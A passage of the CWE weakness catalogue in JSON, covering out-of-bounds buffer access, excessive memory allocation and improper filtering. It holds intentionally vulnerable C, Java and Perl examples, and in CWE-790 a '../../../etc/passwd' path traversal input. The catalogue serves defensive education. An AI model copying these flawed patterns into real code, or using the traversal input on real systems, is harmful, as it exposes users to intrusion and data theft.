          "EntryID": "Part 4-2",
          "EntryName": "Req CR 3.5"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-1029",
          "Authors": [
            "Aleph One"
          ],
          "Title": "Smashing The Stack For Fun And Profit",
          "PublicationYear": "1996",
          "PublicationMonth": "11",
          "PublicationDay": "08",
          "URL": "http://phrack.org/issues/49/14.html"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 5, \"Stack Overruns\" Page 129",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 5, \"Heap Overruns\" Page 138",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 5: Buffer Overruns.\" Page 89",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 3, \"Nonexecutable Stack\", Page 76",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 5, \"Protection Mechanisms\", Page 189",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-90",
          "Title": "Buffer UNDERFLOWS: What do you know about it?",
          "Publication": "Vuln-Dev Mailing List",
          "PublicationYear": "2004",
          "PublicationMonth": "01",
          "PublicationDay": "10",
          "URL": "https://seclists.org/vuln-dev/2004/Jan/22",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-56",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Using the Strsafe.h Functions",
          "URL": "https://learn.microsoft.com/en-us/windows/win32/menurc/strsafe-ovw?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-57",
          "Authors": [
            "Matt Messier",
            "John Viega"
          ],
          "Title": "Safe C String Library v1.0.3",
          "URL": "http://www.gnu-darwin.org/www001/ports-1.5a-CURRENT/devel/safestr/work/safestr-1.0.3/doc/safestr.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-58",
          "Authors": [
            "Michael Howard"
          ],
          "Title": "Address Space Layout Randomization in Windows Vista",
          "URL": "https://learn.microsoft.com/en-us/archive/blogs/michael_howard/address-space-layout-randomization-in-windows-vista",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-60",
          "Title": "PaX",
          "URL": "https://en.wikipedia.org/wiki/Executable_space_protection#PaX",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-61",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Understanding DEP as a mitigation technology part 1",
          "URL": "https://msrc.microsoft.com/blog/2009/06/understanding-dep-as-a-mitigation-technology-part-1/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-64",
          "Authors": [
            "Grant Murphy"
          ],
          "Title": "Position Independent Executables (PIE)",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "28",
          "Publisher": "Red Hat",
          "URL": "https://www.redhat.com/en/blog/position-independent-executables-pie",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1332",
          "Authors": [
            "John Richard Moser"
          ],
          "Title": "Prelink and address space randomization",
          "PublicationYear": "2006",
          "PublicationMonth": "07",
          "PublicationDay": "05",
          "URL": "https://lwn.net/Articles/190139/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1333",
          "Authors": [
            "Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh"
          ],
          "Title": "Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR",
          "PublicationYear": "2016",
          "URL": "http://www.cs.ucr.edu/~nael/pubs/micro16.pdf",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1334",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Stack Frame Canary Validation (D3-SFCV)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:StackFrameCanaryValidation/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1335",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Segment Address Offset Randomization (D3-SAOR)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:SegmentAddressOffsetRandomization/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1336",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Process Segment Execution Prevention (D3-PSEP)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1337",
          "Section": "Memory information leaks",
          "Authors": [
            "Alexander Sotirov and Mark Dowd"
          ],
          "Title": "Bypassing Browser Memory Protections: Setting back browser security by 10 years",
          "PublicationYear": "2008",
          "URL": "https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf",
          "URLDate": "2023-04-26"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "788",
      "Name": "Access of Memory Location After End of Buffer",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product reads or writes to a buffer using an index or pointer that references a memory location after the end of the buffer.",
      "ExtendedDescription": "This typically occurs when a pointer or its index is incremented to a position after the buffer; or when pointer arithmetic results in a position after the buffer.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory"
          ],
          "Note": "For an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffer's position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences."
        },
        {
          "Scope": [
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Memory",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-1",
          "Entries": [
            {
              "IntroText": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"
            },
            {
              "BodyText": "This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker."
            },
            {
              "BodyText": "Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476)."
            }
          ]
        },
        {
          "ID": "DX-114",
          "Entries": [
            {
              "IntroText": "In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint returnChunkSize(void *) {\n```\n/* if chunk info is valid, return the size of usable memory,* \n\t\t\t\n\t\t\t\n\t\t\t ** else, return -1 to indicate an error* \n\t\t\t\n\t\t\t\n\t\t\t **/* \n\t\t\t...}\n\tint main() {\n\t```\n\t\t...\n\t\tmemcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788)."
            }
          ]
        },
        {
          "ID": "DX-19",
          "Entries": [
            {
              "IntroText": "This example applies an encoding procedure to an input string and stores it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar * copy_input(char *user_supplied_string){\n\t\t\tint i, dst_index;\n\t\t\tchar *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);\n\t\t\tif ( MAX_SIZE <= strlen(user_supplied_string) ){\n\t\t\t\tdie(\"user string too long, die evil hacker!\");\n\t\t\t}\n\t\t\tdst_index = 0;\n\t\t\tfor ( i = 0; i < strlen(user_supplied_string); i++ ){\n\t\t\t\t\tif( '&' == user_supplied_string[i] ){\n\t\t\t\t\t\tdst_buf[dst_index++] = '&';\n\t\t\t\t\t\tdst_buf[dst_index++] = 'a';\n\t\t\t\t\t\tdst_buf[dst_index++] = 'm';\n\t\t\t\t\t\tdst_buf[dst_index++] = 'p';\n\t\t\t\t\t\tdst_buf[dst_index++] = ';';\n\t\t\t\t\t}\n\t\t\t\t\telse if ('<' == user_supplied_string[i] ){\n```\n/* encode to &lt; */* \n\t\t\t\t\t\t\t}\n\t\t\t\t\telse dst_buf[dst_index++] = user_supplied_string[i];}\n\t\t\treturn dst_buf;}"
            },
            {
              "BodyText": "The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands."
            }
          ]
        },
        {
          "ID": "DX-91",
          "Entries": [
            {
              "IntroText": "In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint processMessageFromSocket(int socket) {\n\t\t\tint success;\n\t\t\tchar buffer[BUFFER_SIZE];\n\t\t\tchar message[MESSAGE_SIZE];\n```\n// get message from socket and store into buffer* \n\t\t\t\n\t\t\t\n\t\t\t *//Ignoring possibliity that buffer > BUFFER_SIZE* \n\t\t\tif (getMessage(socket, buffer, BUFFER_SIZE) > 0) {\n\t\t\t```\n```\n// place contents of the buffer into message structure* \n\t\t\t\t\tExMessage *msg = recastBuffer(buffer);\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t *// copy message body into string for processing* \n\t\t\t\t\tint index;\n\t\t\t\t\tfor (index = 0; index < msg->msgLength; index++) {\n\t\t\t\t\t```\n\t\t\t\t\t\tmessage[index] = msg->msgBody[index];\n\t\t\t\t\t}\n\t\t\t\t\tmessage[index] = '\\0';\n```\n// process message* \n\t\t\t\t\tsuccess = processMessage(message);}\n\t\t\treturn success;}"
            },
            {
              "BodyText": "However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body (CWE-606). This can result in a buffer over-read (CWE-125) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body (CWE-130)."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2009-2550",
          "Description": "Classic stack-based buffer overflow in media player using a long entry in a playlist",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2550"
        },
        {
          "Reference": "CVE-2009-2403",
          "Description": "Heap-based buffer overflow in media player using a long entry in a playlist",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2403"
        },
        {
          "Reference": "CVE-2009-0689",
          "Description": "large precision value in a format string triggers overflow",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0689"
        },
        {
          "Reference": "CVE-2009-0558",
          "Description": "attacker-controlled array index leads to code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0558"
        },
        {
          "Reference": "CVE-2008-4113",
          "Description": "OS kernel trusts userland-supplied length value, allowing reading of sensitive information",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4113"
        },
        {
          "Reference": "CVE-2007-4268",
          "Description": "Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4268"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCRM",
          "EntryID": "ASCRM-CWE-788"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-961",
          "Section": "ASCRM-CWE-788",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Reliability Measure (ASCRM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCRM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "The CWE entry might be misused when lower-level CWE entries might be available. It also overlaps existing CWE entries and might be deprecated in the future.",
        "Comments": "If the \"Access\" operation is known to be a read or a write, then investigate children of entries such as CWE-787: Out-of-bounds Write and CWE-125: Out-of-bounds Read.",
        "Reasons": [
          "Potential Deprecation",
          "Frequent Misuse"
        ]
      }
    },
    {
      "ID": "789",
      "Name": "Memory Allocation with Excessive Size Value",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product allocates memory based on an untrusted, large size value, but it does not ensure that the size is within expected limits, allowing arbitrary amounts of memory to be allocated.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "770",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "476",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Resultant"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Stack Exhaustion",
          "Description": "When a weakness allocates excessive memory on the stack, it is often described as \"stack exhaustion,\" which is a technical impact of the weakness. This technical impact is often encountered as a consequence of CWE-789 and/or CWE-1325."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (Memory)"
          ],
          "Note": "Not controlling memory allocation can result in a request for too much system memory, possibly leading to a crash of the application due to out-of-memory conditions, or the consumption of a large amount of memory on the system."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Description": "Perform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary."
        },
        {
          "Phase": [
            "Operation"
          ],
          "Description": "Run your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Consider the following code, which accepts an untrusted size value and allocates a buffer to contain a string of the given size."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tunsigned int size = GetUntrustedInt();\n```\n/* ignore integer overflow (CWE-190) for this example */* \n\t\n\tunsigned int totBytes = size * sizeof(char);\n\tchar *string = (char *)malloc(totBytes);\n\tInitializeString(string);"
            },
            {
              "BodyText": "Suppose an attacker provides a size value of:"
            },
            {
              "BodyText": "```\n\t\t12345678\n```"
            },
            {
              "BodyText": "This will cause 305,419,896 bytes (over 291 megabytes) to be allocated for the string."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Consider the following code, which accepts an untrusted size value and uses the size as an initial capacity for a HashMap."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tunsigned int size = GetUntrustedInt();\n\tHashMap list = new HashMap(size);\n```"
            },
            {
              "BodyText": "The HashMap constructor will verify that the initial capacity is not negative, however there is no check in place to verify that sufficient memory is present. If the attacker provides a large enough value, the application will run into an OutOfMemoryError."
            }
          ]
        },
        {
          "ID": "DX-137",
          "Entries": [
            {
              "IntroText": "This code performs a stack allocation based on a length calculation."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t int a = 5, b = 6;\n\t size_t len = a - b;\n\t char buf[len]; // Just blows up the stack \n }\n```"
            },
            {
              "BodyText": "Since a and b are declared as signed ints, the \"a - b\" subtraction gives a negative result (-1). However, since len is declared to be unsigned, len is cast to an extremely large positive number (on 32-bit systems - 4294967295). As a result, the buffer buf[len] declaration uses an extremely large size to allocate on the stack, very likely more than the entire computer's memory space."
            },
            {
              "BodyText": "Miscalculations usually will not be so obvious. The calculation will either be complicated or the result of an attacker's input to attain the negative value."
            }
          ]
        },
        {
          "ID": "DX-138",
          "Entries": [
            {
              "IntroText": "This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "int proc_msg(char *s, int msg_len)\n {\n\n```\n```\n// Note space at the end of the string - assume all strings have preamble with space* \n\t int pre_len = sizeof(\"preamble: \");\n\t char buf[pre_len - msg_len];\n\t\n\t *... Do processing here if we get this far*  }\n char *s = \"preamble: message\\n\";\n char *sl = strchr(s, ':'); // Number of characters up to ':' (not including space)\n int jnklen = sl == NULL ? 0 : sl - s; // If undefined pointer, use zero length\n int ret_val = proc_msg (\"s\", jnklen); // Violate assumption of preamble length, end up with negative value, blow out stack"
            },
            {
              "BodyText": "The buffer length ends up being -1, resulting in a blown out stack. The space character after the colon is included in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code obtains an untrusted number that is used as an index into an array of messages."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $num = GetUntrustedNumber();\n\tmy @messages = ();\n\t$messages[$num] = \"Hello World\";\n```"
            },
            {
              "BodyText": "The index is not validated at all (CWE-129), so it might be possible for an attacker to modify an element in @messages that was not intended. If an index is used that is larger than the current size of the array, the Perl interpreter automatically expands the array so that the large index works."
            },
            {
              "BodyText": "If $num is a large value such as 2147483648 (1<<31), then the assignment to $messages[$num] would attempt to create a very large array, then eventually produce an error message such as:"
            },
            {
              "BodyText": "Out of memory during array extend"
            },
            {
              "BodyText": "This memory exhaustion will cause the Perl program to exit, possibly a denial of service. In addition, the lack of memory could also prevent many other programs from successfully running on the system."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action. The buffer length ends up being -1 resulting in a blown out stack. The space character after the colon is included in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "int proc_msg(char *s, int msg_len)\n {\n\n```\n\tint pre_len = sizeof(\"preamble: \"); // Note space at the end of the string - assume all strings have preamble with space\n\tchar buf[pre_len - msg_len];\n\t... Do processing here and set status\n\treturn status;\n } \n char *s = \"preamble: message\\n\";\n char *sl = strchr(s, ':'); // Number of characters up to ':' (not including space)\n int jnklen = sl == NULL ? 0 : sl - s; // If undefined pointer, use zero length\n int ret_val = proc_msg (\"s\", jnklen); // Violate assumption of preamble length, end up with negative value, blow out stack\n```"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "int proc_msg(char *s, int msg_len)\n {\n\n```\n\tint pre_len = sizeof(\"preamble: \"); // Note space at the end of the string - assume all strings have preamble with space\n\tif (pre_len <= msg_len) { // Log error; return error_code; }\n\tchar buf[pre_len - msg_len];\n\t... Do processing here and set status\n\treturn status;\n } \n char *s = \"preamble: message\\n\";\n char *sl = strchr(s, ':'); // Number of characters up to ':' (not including space)\n int jnklen = sl == NULL ? 0 : sl - s; // If undefined pointer, use zero length\n int ret_val = proc_msg (\"s\", jnklen); // Violate assumption of preamble length, end up with negative value, blow out stack\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-21668",
          "Description": "Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-21668"
        },
        {
          "Reference": "CVE-2010-3701",
          "Description": "program uses ::alloca() for encoding messages, but large messages trigger segfault",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3701"
        },
        {
          "Reference": "CVE-2008-1708",
          "Description": "memory consumption and daemon exit by specifying a large value in a length field",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1708"
        },
        {
          "Reference": "CVE-2008-0977",
          "Description": "large value in a length field leads to memory consumption and crash when no more memory is available",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0977"
        },
        {
          "Reference": "CVE-2006-3791",
          "Description": "large key size in game program triggers crash when a resizing function cannot allocate enough memory",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-3791"
        },
        {
          "Reference": "CVE-2004-2589",
          "Description": "large Content-Length HTTP header value triggers application crash in instant messaging application due to failure in memory allocation",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2589"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "35",
          "EntryName": "SOAP Array Abuse"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM35-C",
          "EntryName": "Allocate sufficient memory for an object",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "IDS32-PL",
          "EntryName": "Validate any integer that is used as an array index",
          "MappingFit": "Imprecise"
        },
        {
          "TaxonomyName": "OMG ASCSM",
          "EntryID": "ASCSM-CWE-789"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 10, \"Resource Limits\", Page 574",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-962",
          "Section": "ASCSM-CWE-789",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Security Measure (ASCSM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "http://www.omg.org/spec/ASCSM/1.0/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness can be closely associated with integer overflows (CWE-190). Integer overflow attacks would concentrate on providing an extremely large number that triggers an overflow that causes less memory to be allocated than expected. By providing a large value that does not trigger an integer overflow, the attacker could still cause excessive amounts of memory to be allocated."
        },
        {
          "Type": "Applicable Platform",
          "Note": "\n\nUncontrolled memory allocation is possible in many languages, such as dynamic array allocation in perl or initial size parameters in Collections in Java. However, languages like C and C++ where programmers have the power to more directly control memory management will be more susceptible.\n"
        }
      ]
    },
    {
      "ID": "790",
      "Name": "Improper Filtering of Special Elements",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "138",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-2",
          "Entries": [
            {
              "IntroText": "The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $Username = GetUntrustedInput();\n\t$Username =~ s/\\.\\.\\///;\n\tmy $filename = \"/home/user/\" . $Username;\n\tReadAndSendFile($filename);\n```"
            },
            {
              "BodyText": "Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\t../../../etc/passwd\n```"
            },
            {
              "BodyText": "will have the first \"../\" stripped, resulting in:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t../../etc/passwd\n```"
            },
            {
              "BodyText": "This value is then concatenated with the /home/user/ directory:"
            },
            {
              "Nature": "Result",
              "ExampleCode": "```\n\t/home/user/../../etc/passwd\n```"
            },
            {
              "BodyText": "which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
